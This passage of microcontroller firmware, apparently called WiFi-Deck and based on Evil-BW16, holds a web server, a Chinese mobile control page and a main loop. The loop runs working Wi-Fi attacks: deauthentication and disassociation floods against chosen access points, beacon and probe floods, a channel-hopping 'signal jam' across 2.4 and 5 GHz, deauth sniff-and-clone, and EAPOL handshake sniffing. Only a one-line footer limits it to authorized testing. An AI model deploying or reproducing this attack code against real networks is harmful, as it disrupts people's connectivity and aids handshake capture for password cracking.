  if (!apEnabled) return;  // ap off 后 WebServer 已关闭，避免操作已 end 的 server
  WiFiClient client = webServer.available();
  if (!client || !client.connected()) return;

  String request = "";
  unsigned long timeout = millis() + 3000;
  while (client.available() == 0 && millis() < timeout) {
    delay(1);
  }
  while (client.connected() && millis() < timeout) {
    while (client.available()) {
      char c = client.read();
      request += c;
      if (request.length() > 4096) break;
    }
    int headerEnd = request.indexOf("\r\n\r\n");
    if (headerEnd >= 0) {
      // GET is complete once the headers are in. For POST the body may arrive
      // in a later TCP packet, so wait briefly for it before giving up.
      if (request.startsWith("GET ") || request.length() > (size_t)(headerEnd + 4)) {
        break;
      }
      delay(20);
      while (client.available()) {
        char c = client.read();
        request += c;
        if (request.length() > 4096) break;
      }
      break;
    }
    if (request.length() > 4096) break;
    delay(1);
  }

  if (request.length() == 0) {
    client.stop();
    return;
  }

  String method = parseMethod(request);
  String fullPath = parsePath(request);
  String path = fullPath;
  int qIdx = path.indexOf('?');
  if (qIdx >= 0) path = path.substring(0, qIdx);

  Serial.println("[WEB] " + method + " " + fullPath);

  if (USE_LED) digitalWrite(LED_G, HIGH);

  if (path == "/api/scan" && method == "GET") {
    String json = getScanResultsJSON();
    client.write(httpHeader(200, "application/json", json.length()).c_str());
    client.write(json.c_str());
  }
  else if (path == "/api/scan" && method == "POST") {
    handleCommand("scan");
    String json = "{\"status\":\"scan_complete\",\"count\":" + String(scan_results.size()) + "}";
    client.write(httpHeader(200, "application/json", json.length()).c_str());
    client.write(json.c_str());
  }
  else if (path == "/api/status" && method == "GET") {
    String json = getStatusJSON();
    client.write(httpHeader(200, "application/json", json.length()).c_str());
    client.write(json.c_str());
  }
  else if (path == "/api/info" && method == "GET") {
    String json = getInfoJSON();
    client.write(httpHeader(200, "application/json", json.length()).c_str());
    client.write(json.c_str());
  }
  else if (path == "/api/command" && method == "POST") {
    String body = parseBody(request);
    String cmd = getPostValue(body, "cmd");
    cmd.trim();
    if (cmd.length() == 0) cmd = getQueryParam(fullPath, "cmd");
    if (cmd.length() > 0) {
      handleCommand(cmd);
      String json = "{\"status\":\"ok\",\"command\":\"" + jsonEscape(cmd) + "\"}";
      client.write(httpHeader(200, "application/json", json.length()).c_str());
      client.write(json.c_str());
    } else {
      String json = "{\"status\":\"error\",\"message\":\"No command provided\"}";
      client.write(httpHeader(400, "application/json", json.length()).c_str());
      client.write(json.c_str());
    }
  }
  else if (path == "/api/target" && method == "POST") {
    String indices = getQueryParam(fullPath, "indices");
    if (indices.length() == 0) {
      String body = parseBody(request);
      indices = getPostValue(body, "indices");
    }
    String cmd = "set target " + indices;
    handleCommand(cmd);
    String json = "{\"status\":\"ok\",\"targets\":" + String(target_aps.size()) + ",\"target_mode\":" + String(target_mode ? "true" : "false") + "}";
    client.write(httpHeader(200, "application/json", json.length()).c_str());
    client.write(json.c_str());
  }
  else if (path == "/api/config" && method == "POST") {
    String body = parseBody(request);
    String result = "";
    if (body.indexOf("ap_ssid=") >= 0) {
      String newSsid = getPostValue(body, "ap_ssid");
      newSsid.trim();
      if (newSsid.length() >= 1 && newSsid != String(ap_ssid)) {
        handleCommand("set ap_ssid " + newSsid);
        result += "ap_ssid updated ";
      }
    }
    if (body.indexOf("ap_pass=") >= 0) {
      String newPass = getPostValue(body, "ap_pass");
      newPass.trim();
      if (newPass.length() >= 8 && newPass != String(ap_pass)) {
        handleCommand("set ap_pass " + newPass);
        result += "ap_pass updated ";
      }
    }
    if (body.indexOf("ble_name=") >= 0) {
      String newBle = getPostValue(body, "ble_name");
      newBle.trim();
      if (newBle.length() >= 1 && newBle != String(ble_name)) {
        handleCommand("set ble_name " + newBle);
        result += "ble_name updated ";
      }
    }
    if (body.indexOf("cycle_delay=") >= 0) {
      handleCommand("set cycle_delay " + getPostValue(body, "cycle_delay"));
      result += "cycle_delay updated ";
    }
    if (body.indexOf("scan_time=") >= 0) {
      handleCommand("set scan_time " + getPostValue(body, "scan_time"));
      result += "scan_time updated ";
    }
    if (body.indexOf("num_frames=") >= 0) {
      handleCommand("set num_frames " + getPostValue(body, "num_frames"));
      result += "num_frames updated ";
    }
    if (body.indexOf("start_channel=") >= 0) {
      handleCommand("set start_channel " + getPostValue(body, "start_channel"));
      result += "start_channel updated ";
    }
    if (body.indexOf("led=") >= 0) {
      handleCommand("set led " + getPostValue(body, "led"));
      result += "led updated ";
    }
    if (body.indexOf("scan_cycles=") >= 0) {
      handleCommand("set scan_cycles " + getPostValue(body, "scan_cycles"));
      result += "scan_cycles updated ";
    }
    String json = "{\"status\":\"ok\",\"message\":\"" + jsonEscape(result) + "\"}";
    client.write(httpHeader(200, "application/json", json.length()).c_str());
    client.write(json.c_str());
  }
  else if (path == "/" && method == "GET") {
    client.write(httpHeader(200, "text/html", strlen(INDEX_HTML)).c_str());
    sendLargeText(client, INDEX_HTML, strlen(INDEX_HTML));
  }
  else {
    String msg = "404 Not Found";
    client.write(httpHeader(404, "text/plain", msg.length()).c_str());
    client.write(msg.c_str());
  }

  delay(10);
  client.stop();
  if (USE_LED) digitalWrite(LED_G, LOW);
}

//==========================================================
// HTML Page (Mobile-friendly Web UI)
//==========================================================
const char INDEX_HTML[] = R"=====(<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#1a1a2e">
<title>WiFi-Deck</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#1a1a2e;color:#e0e0e0;font-family:-apple-system,sans-serif;padding-bottom:60px}
.header{background:#16213e;padding:12px 16px;position:sticky;top:0;z-index:100;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #0f3460}
.header h1{font-size:18px;font-weight:600}
.header .status-dot{width:10px;height:10px;border-radius:50%;background:#555;transition:.3s}
.header .status-dot.active{background:#e94560}
.header .status-dot.attacking{background:#ff4757;animation:pulse 1s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
.tabs{display:flex;background:#16213e;border-bottom:1px solid #0f3460}
.tab{flex:1;padding:12px 0;text-align:center;font-size:13px;color:#888;cursor:pointer;border-bottom:2px solid transparent;transition:.2s}
.tab.active{color:#e94560;border-color:#e94560}
.tab:active{background:#0f3460}
.page{display:none;padding:12px}
.page.active{display:block}
.btn{display:inline-block;width:100%;padding:12px;margin:4px 0;border:none;border-radius:8px;font-size:14px;font-weight:600;text-align:center;cursor:pointer;transition:.2s}
.btn:active{transform:scale(.97)}
.btn-primary{background:#e94560;color:#fff}
.btn-success{background:#2ecc71;color:#fff}
.btn-danger{background:#e74c3c;color:#fff}
.btn-warning{background:#f39c12;color:#000}
.btn-info{background:#3498db;color:#fff}
.btn-dark{background:#2c3e50;color:#fff}
.btn:disabled{opacity:.4;cursor:not-allowed;transform:none}
.net-item{background:#16213e;border-radius:8px;padding:10px 12px;margin:6px 0;display:flex;align-items:center;cursor:pointer;border:1px solid transparent;transition:.2s}
.net-item:active{background:#0f3460}
.net-item.selected{border-color:#e94560;background:#1a1a3e}
.net-info{flex:1}
.net-ssid{font-size:14px;font-weight:600;margin-bottom:2px;word-break:break-all}
.net-meta{font-size:11px;color:#888}
.net-band{font-size:10px;padding:2px 6px;border-radius:4px;margin-left:6px}
.net-band.band5{background:#e94560;color:#fff}
.net-band.band24{background:#3498db;color:#fff}
.net-check{width:24px;height:24px;border:2px solid #555;border-radius:6px;display:flex;align-items:center;justify-content:center;margin-left:8px;transition:.2s}
.net-item.selected .net-check{background:#e94560;border-color:#e94560}
.net-item.selected .net-check::after{content:'✓';color:#fff;font-size:14px}
.bar{width:100%;height:8px;background:#2c3e50;border-radius:4px;overflow:hidden;margin-top:4px}
.bar-fill{height:100%;border-radius:4px;transition:.3s}
.bar-fill.good{background:#2ecc71}
.bar-fill.mid{background:#f39c12}
.bar-fill.bad{background:#e74c3c}
.stats{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:8px 0}
.stat-card{background:#16213e;border-radius:8px;padding:10px;text-align:center}
.stat-val{font-size:20px;font-weight:700;color:#e94560}
.stat-label{font-size:11px;color:#888;margin-top:2px}
.config-row{display:flex;justify-content:space-between;align-items:center;padding:8px 12px;background:#16213e;border-radius:8px;margin:4px 0}
.config-label{font-size:13px;color:#aaa}
.config-input{width:80px;padding:6px 8px;background:#0f3460;border:1px solid #1a1a4e;border-radius:6px;color:#fff;font-size:13px;text-align:right}
.loading{display:none;text-align:center;padding:20px;color:#888;font-size:13px}
.loading.show{display:block}
.toast{position:fixed;bottom:70px;left:50%;transform:translateX(-50%);background:#16213e;color:#e94560;padding:10px 20px;border-radius:8px;font-size:13px;z-index:200;opacity:0;transition:.3s;pointer-events:none;border:1px solid #e94560}
.toast.show{opacity:1}
.footer{text-align:center;padding:8px;font-size:11px;color:#444}
</style>
</head>
<body>
<div class="header">
<h1>⚡ WiFi-Deck</h1>
<div class="status-dot" id="statusDot"></div>
</div>
<div class="tabs">
<div class="tab active" onclick="showPage('scan')">📡 扫描</div>
<div class="tab" onclick="showPage('attack')">⚔️ 攻击</div>
<div class="tab" onclick="showPage('config')">⚙️ 设置</div>
</div>
<div class="page active" id="page-scan">
<button class="btn btn-info" onclick="doScan()">🔄 扫描 WiFi</button>
<div class="loading" id="scanLoading">扫描中... (约5秒)</div>
<div id="netList"></div>
</div>
<div class="page" id="page-attack">
<div class="stats">
<div class="stat-card"><div class="stat-val" id="statTargets">0</div><div class="stat-label">已选目标</div></div>
<div class="stat-card"><div class="stat-val" id="statNets">0</div><div class="stat-label">网络总数</div></div>
</div>
<button class="btn btn-primary" onclick="startAttack('start deauther')">▶️ 开始 Deauth</button>
<button class="btn btn-warning" onclick="startAttack('disassoc')">▶️ 开始 Disassoc</button>
<button class="btn btn-dark" onclick="sendCmd('random_attack')">🎲 随机攻击</button>
<button class="btn btn-info" onclick="timedAttack()">⏱️ 定时攻击</button>
<hr style="border:0;border-top:1px solid #0f3460;margin:8px 0">
<button class="btn btn-success" onclick="sendCmd('stop')">⏹️ 停止所有攻击</button>
<hr style="border:0;border-top:1px solid #0f3460;margin:8px 0">
<button class="btn btn-dark" onclick="sendCmd('beacon_flood')">📶 Beacon Flood</button>
<button class="btn btn-dark" onclick="sendCmd('probe_flood')">📡 Probe Flood</button>
<button class="btn btn-dark" onclick="sendCmd('signal_jam')">📳 Signal Jam</button>
<button class="btn btn-dark" onclick="sendCmd('deauth_sniff')">🎯 Deauth 嗅探克隆</button>
<button class="btn btn-dark" onclick="singleApAttack()">🎯 单AP攻击</button>
<hr style="border:0;border-top:1px solid #0f3460;margin:8px 0">
<button class="btn btn-dark" onclick="sendCmd('start sniff')">👁️ 开始嗅探(ALL)</button>
<button class="btn btn-dark" onclick="sendCmd('sniff deauth')">👁️ 嗅探 Deauth</button>
<button class="btn btn-dark" onclick="sendCmd('sniff eapol')">👁️ 嗅探 EAPOL</button>
<button class="btn btn-dark" onclick="sendCmd('stop sniff')">🛑 停止嗅探</button>
<button class="btn btn-dark" onclick="sendCmd('hop on')">📺 信道跳频开</button>
<button class="btn btn-dark" onclick="sendCmd('hop off')">📺 信道跳频关</button>
</div>
<div class="page" id="page-config">
<div class="config-row"><span class="config-label">BLE 蓝牙名称</span><input class="config-input" style="width:140px" type="text" maxlength="26" id="cfgBleName" value="WiFi-Deck"></div>
<div class="config-row"><span class="config-label">WiFi 热点名称</span><input class="config-input" style="width:140px" type="text" maxlength="32" id="cfgApSsid" value="WiFi-Deck"></div>
<div class="config-row"><span class="config-label">WiFi 热点密码</span><input class="config-input" style="width:140px" type="text" maxlength="63" id="cfgApPass" value="12345678"></div>
<div class="config-row"><span class="config-label">攻击间隔 (ms)</span><input class="config-input" type="number" id="cfgCycleDelay" value="2000"></div>
<div class="config-row"><span class="config-label">扫描时间 (ms)</span><input class="config-input" type="number" id="cfgScanTime" value="5000"></div>
<div class="config-row"><span class="config-label">每AP帧数</span><input class="config-input" type="number" id="cfgNumFrames" value="3"></div>
<div class="config-row"><span class="config-label">起始信道</span><input class="config-input" type="number" id="cfgStartChannel" value="1"></div>
<div class="config-row"><span class="config-label">循环间扫描</span><select class="config-input" id="cfgScanCycles"><option value="off">关</option><option value="on">开</option></select></div>
<div class="config-row"><span class="config-label">LED 指示</span><select class="config-input" id="cfgLed"><option value="on">开</option><option value="off">关</option></select></div>
<button class="btn btn-primary" onclick="saveConfig()">💾 保存配置 (掉电记忆)</button>
<hr style="border:0;border-top:1px solid #0f3460;margin:8px 0">
<div class="stat-card"><div class="stat-val" id="cfgUptime">--</div><div class="stat-label">运行时间</div></div>
<div class="footer">WiFi-Deck | Based on 7h30th3r0n3/Evil-BW16<br>⚠️ For educational and authorized testing only</div>
</div>
<div class="toast" id="toast"></div>
<script>
const API='/api';
let selectedIndices=new Set();let scanCache=null;
function showPage(p){document.querySelectorAll('.tab').forEach((t,i)=>t.classList.toggle('active',['scan','attack','config'][i]===p));document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active'));document.getElementById('page-'+p).classList.add('active');if(p==='attack')updateAttackStats();}
function toast(msg){let t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2000);}
async function fetchJSON(url,opts={}){try{let r=await fetch(url,opts);return await r.json();}catch(e){toast('Network error');return null;}}
async function doScan(){document.getElementById('scanLoading').classList.add('show');document.getElementById('netList').innerHTML='';selectedIndices.clear();await fetchJSON(API+'/scan',{method:'POST'});scanCache=await fetchJSON(API+'/scan');if(scanCache){toast('扫描完成: '+scanCache.count+' 个网络');renderNetworksData(scanCache);}document.getElementById('scanLoading').classList.remove('show');}
function renderNetworks(){if(scanCache){renderNetworksData(scanCache);}else{fetchJSON(API+'/scan').then(d=>{if(d){scanCache=d;selectedIndices.clear();d.networks.forEach(n=>{if(n.selected)selectedIndices.add(n.index);});renderNetworksData(d);updateAttackStats();}});}}
function renderNetworksData(data){let html='';data.networks.forEach(n=>{let pct=Math.max(0,Math.min(100,n.rssi+120));let cls=pct>60?'good':(pct>35?'mid':'bad');let bandCls=n.channel>=36?'band5':'band24';let bandTxt=n.channel>=36?'5G':'2.4G';let sel=selectedIndices.has(n.index)?'selected':'';html+=`<div class="net-item ${sel}" onclick="toggleNet(${n.index})"><div class="net-info"><div class="net-ssid">${escHtml(n.ssid||'(隐藏)')}</div><div class="net-meta">CH:${n.channel} BSSID:${n.bssid} RSSI:${n.rssi}dBm <span class="net-band ${bandCls}">${bandTxt}</span></div><div class="bar"><div class="bar-fill ${cls}" style="width:${pct}%"></div></div></div><div class="net-check"></div></div>`;});if(!html)html='<p style="text-align:center;color:#666;padding:20px">暂无扫描结果，请先扫描</p>';document.getElementById('netList').innerHTML=html;}
function toggleNet(idx){if(selectedIndices.has(idx))selectedIndices.delete(idx);else selectedIndices.add(idx);renderNetworksData(scanCache||{networks:[]});updateAttackStats();}
async function setTargets(){let indices=Array.from(selectedIndices).join(',');let data=await fetchJSON(API+'/target?indices='+indices,{method:'POST'});if(data){toast('已设置 '+data.targets+' 个目标');return true;}return false;}function startAttack(cmd){setTargets().then(()=>sendCmd(cmd));}function singleApAttack(){if(selectedIndices.size===0){toast('请先在扫描页选择一个目标');return;}let firstIdx=Array.from(selectedIndices)[0];sendCmd('single_ap '+firstIdx);}function escHtml(s){return String(s).replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));}
async function sendCmd(cmd){let data=await fetchJSON(API+'/command',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cmd='+encodeURIComponent(cmd)});if(data)toast('已执行: '+cmd);}
async function timedAttack(){let ms=prompt('攻击持续时间(ms):','10000');if(ms&&parseInt(ms)>0){await setTargets();sendCmd('attack_time '+ms);}}
async function updateAttackStats(){document.getElementById('statTargets').textContent=selectedIndices.size;let data=await fetchJSON(API+'/status');if(data){document.getElementById('statNets').textContent=data.scan_count;let dot=document.getElementById('statusDot');dot.className='status-dot';if(data.attack_enabled||data.disassoc_enabled||data.beacon_flood||data.probe_flood||data.signal_jam||data.deauth_sniff)dot.classList.add('attacking');else if(data.sniffing)dot.classList.add('active');let s=Math.floor(data.uptime/1000);let m=Math.floor(s/60);let h=Math.floor(m/60);document.getElementById('cfgUptime').textContent=h+'h '+(m%60)+'m';}}
async function saveConfig(){let pass=document.getElementById('cfgApPass').value.trim();if(pass.length<8){toast('WiFi 密码至少需要 8 位');return;}let body='ble_name='+encodeURIComponent(document.getElementById('cfgBleName').value.trim());body+='&ap_ssid='+encodeURIComponent(document.getElementById('cfgApSsid').value.trim());body+='&ap_pass='+encodeURIComponent(pass);body+='&cycle_delay='+document.getElementById('cfgCycleDelay').value;body+='&scan_time='+document.getElementById('cfgScanTime').value;body+='&num_frames='+document.getElementById('cfgNumFrames').value;body+='&start_channel='+document.getElementById('cfgStartChannel').value;body+='&scan_cycles='+document.getElementById('cfgScanCycles').value;body+='&led='+document.getElementById('cfgLed').value;let data=await fetchJSON(API+'/config',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body});if(data)toast('配置已保存至 Flash');}
async function initStatus(){let data=await fetchJSON(API+'/info');if(data){if(data.ble_name)document.getElementById('cfgBleName').value=data.ble_name;if(data.ssid)document.getElementById('cfgApSsid').value=data.ssid;if(data.pass)document.getElementById('cfgApPass').value=data.pass;document.getElementById('cfgCycleDelay').value=data.cycle_delay;document.getElementById('cfgScanTime').value=data.scan_time;document.getElementById('cfgNumFrames').value=data.num_frames;document.getElementById('cfgStartChannel').value=data.start_channel;document.getElementById('cfgScanCycles').value=data.scan_between_cycles?'on':'off';document.getElementById('cfgLed').value=data.led?'on':'off';}}
window.onload=()=>{renderNetworks();initStatus();setInterval(()=>{if(document.getElementById('page-attack').classList.contains('active'))updateAttackStats();},3000);};
</script>
</body>
</html>)=====";

//==========================================================
// Setup
//==========================================================
void setup() {
  Serial.begin(115200);

  loadConfigFromFlash();

  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  if (USE_LED) {
    digitalWrite(LED_R, HIGH); delay(100); digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, HIGH); delay(100); digitalWrite(LED_G, LOW);
    digitalWrite(LED_B, HIGH); delay(100); digitalWrite(LED_B, LOW);
  }

  Serial.println("=== WiFi-Deck ===");
  Serial.println("[INFO] Starting WiFi AP (non-hidden)...");

  // Start AP in non-hidden mode so phones can discover it
  startSoftAP();

  Serial.println("[INFO] AP started: " + String(ap_ssid));
  Serial.println("[INFO] Connect to this WiFi and open 192.168.1.1");
  Serial.println("[INFO] Web server started on port 80");

  // Start BLE UART service for the Android App
  setupBLE();

  last_cycle = millis();
}

//==========================================================
// Main Loop
//==========================================================
void loop() {
  // BLE 异常掉线复位：连接断开后若未收到 CCCD 取消订阅回调，bleNotifyEnabled 会残留为 true，
  // 导致对不存在的连接反复 notify
  if (bleNotifyEnabled && !BLE.connected(activeConnId)) {
    bleNotifyEnabled = false;
  }

  // Handle commands from Serial
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    handleCommand(command);
  }

  // Handle commands queued from the BLE task (ring buffer)
  while (cmdTail != cmdHead) {
    String cmd = String(cmdRing[cmdTail]);
    cmdTail = (cmdTail + 1) % CMD_RING_SIZE;
    handleCommand(cmd);
  }

  // Handle web clients (throttled to 25ms to reduce lwIP non-blocking accept overhead)
  static unsigned long lastWebPoll = 0;
  if (millis() - lastWebPoll >= 25) {
    lastWebPoll = millis();
    handleWebClient();
  }

  // Deferred SoftAP restart after SSID/Password change (allows BLE notify / HTTP 200 to flush first)
  if (pendingApRestart) {
    pendingApRestart = false;
    if (apEnabled && !isSniffing) {
      delay(50);
      startSoftAP();
      Serial.println("[INFO] SoftAP restarted with new credentials: " + String(ap_ssid));
    }
  }

  // Timed Attack check
  checkTimedAttack();

  // Attack cycles
  if (millis() - last_cycle > cycle_delay) {
    if (attack_enabled) {
      if (scan_between_cycles) {
        Serial.println("[INFO] Starting scan between attack cycles...");
        if (scanNetworks() == 0) {
          printScanResults();
        }
      }
      if (target_mode) {
        targetAttack();
      }
      else {
        generalAttack();
      }
    }
    last_cycle = millis();
  }

  //===============================
  // CONTINUOUS DISASSOC ATTACK
  //===============================
  if (disassoc_enabled && (millis() - last_disassoc_attack >= disassoc_interval)) {
    last_disassoc_attack = millis();

    const std::vector<WiFiScanResult> &aps_to_attack =
      (target_mode && !target_aps.empty()) ? target_aps : scan_results;

    if (!aps_to_attack.empty()) {
      if (USE_LED) digitalWrite(LED_B, HIGH);
      for (size_t i = 0; i < aps_to_attack.size(); i++) {
        if (wifi_set_channel(aps_to_attack[i].channel) != 0) {
          Serial.print("[WARN] wifi_set_channel(");
          Serial.print(aps_to_attack[i].channel);
          Serial.println(") failed");
          continue;
        }
        currentChannel = aps_to_attack[i].channel;
        for (unsigned long j = 0; j < num_send_frames; j++) {
          uint16_t reason = disassoc_reasons[j % num_disassoc_reasons];
          // 仅发 AP -> Broadcast 的有效帧
          wifi_tx_disassoc_frame(aps_to_attack[i].bssid, dst_mac, reason);
          delay(1);
        }
      }
      if (apEnabled) {
        wifi_set_channel(WIFI_CHANNEL);
      }
      if (USE_LED) digitalWrite(LED_B, LOW);
      Serial.println("[DISASSOC] Attack cycle completed.");
    }
  }

  //===============================
  // BEACON FLOOD
  //===============================
  if (beacon_flood_enabled && (millis() - last_beacon_flood >= beacon_flood_delay)) {
    last_beacon_flood = millis();
    char fakeSSID[BEACON_MAX_SSID_LEN + 1];
    int ssidLen = random(8, 17);
    for (int i = 0; i < ssidLen; i++) {
      fakeSSID[i] = random(33, 127);
    }
    fakeSSID[ssidLen] = 0;
    wifi_tx_beacon_frame(fakeSSID, ssidLen, currentChannel);
    beacon_flood_count++;
    if (beacon_flood_count % 20 == 0) {
      Serial.print("[BCN FLOOD] ");
      Serial.print(beacon_flood_count);
      Serial.println(" beacons sent");
    }
  }

  //===============================
  // PROBE FLOOD
  //===============================
  if (probe_flood_enabled && (millis() - last_probe_flood >= probe_flood_delay)) {
    last_probe_flood = millis();
    char fakeSSID[BEACON_MAX_SSID_LEN + 1];
    int ssidLen = random(4, 13);
    for (int i = 0; i < ssidLen; i++) {
      fakeSSID[i] = random(33, 127);
    }
    fakeSSID[ssidLen] = 0;
    wifi_tx_probe_req_frame(fakeSSID, ssidLen);
    probe_flood_count++;
    if (probe_flood_count % 50 == 0) {
      Serial.print("[PRB FLOOD] ");
      Serial.print(probe_flood_count);
      Serial.println(" probes sent");
    }
  }

  //===============================
  // SIGNAL JAM (rapid channel cycling + deauth)
  //===============================
  if (signal_jam_enabled && (millis() - last_signal_jam >= signal_jam_hop_delay)) {
    last_signal_jam = millis();
    // 合并轮询 2.4G + 5G 全信道，避免 Signal Jam 只干扰 2.4GHz
    static const int num2G = sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0]);
    static const int num5G = sizeof(CHANNELS_5GHZ) / sizeof(CHANNELS_5GHZ[0]);
    int totalChs = num2G + num5G;
    signal_jam_ch_index = (signal_jam_ch_index + 1) % totalChs;
    if (signal_jam_ch_index < num2G) {
      currentChannel = CHANNELS_2GHZ[signal_jam_ch_index];
    } else {
      currentChannel = CHANNELS_5GHZ[signal_jam_ch_index - num2G];
    }
    wifi_set_channel(currentChannel);
    for (int j = 0; j < 3; j++) {
      uint8_t fakeBSSID[6];
      randomMAC(fakeBSSID);
      wifi_tx_deauth_frame(fakeBSSID, dst_mac, deauth_reasons[j % num_deauth_reasons]);
    }
    signal_jam_count++;
    if (USE_LED) { digitalWrite(LED_B, !digitalRead(LED_B)); }
    if (signal_jam_count % 50 == 0) {
      Serial.print("[SIG JAM] ");
      Serial.print(signal_jam_count);
      Serial.print(" cycles, ch=");
      Serial.println(currentChannel);
    }
  }

  //===============================
  // DEAUTH SNIFF-AND-CLONE
  //===============================
  if (deauth_sniff_enabled && has_sniffed_deauth && (millis() - last_deauth_sniff_attack >= deauth_sniff_interval)) {
    last_deauth_sniff_attack = millis();
    // Briefly leave promisc to TX from the cloned source MAC, then resume
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
    isSniffing = false;
    for (unsigned long j = 0; j < num_send_frames; j++) {
      wifi_tx_deauth_frame(sniffed_deauth_src, dst_mac, deauth_reasons[j % num_deauth_reasons]);
      delay(1);
    }
    has_sniffed_deauth = false;
    wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1);
    isSniffing = true;
  }

  // Handle channel hopping if enabled
  if (isSniffing) {
    hopChannel();
  }

  // Push sniff logs to BLE (throttled to one line per ~25ms)
  static unsigned long lastLogPush = 0;
  if (logTail != logHead && (millis() - lastLogPush >= 25)) {
    lastLogPush = millis();
    String escapedMsg = jsonEscape(String(sniffLogRing[logTail]));
    if (escapedMsg.length() > 190) {
      escapedMsg = escapedMsg.substring(0, 190) + "...";
    }
    String logLine = String("{\"t\":\"log\",\"m\":\"") + escapedMsg + "\"}";
    bleSendLine(logLine);
    logTail = (logTail + 1) % LOG_RING_SIZE;
  }

  // Push status heartbeat every 1s
  static unsigned long lastStatusPush = 0;
  if (millis() - lastStatusPush >= 1000) {
    lastStatusPush = millis();
    blePushStatus();
  }
}
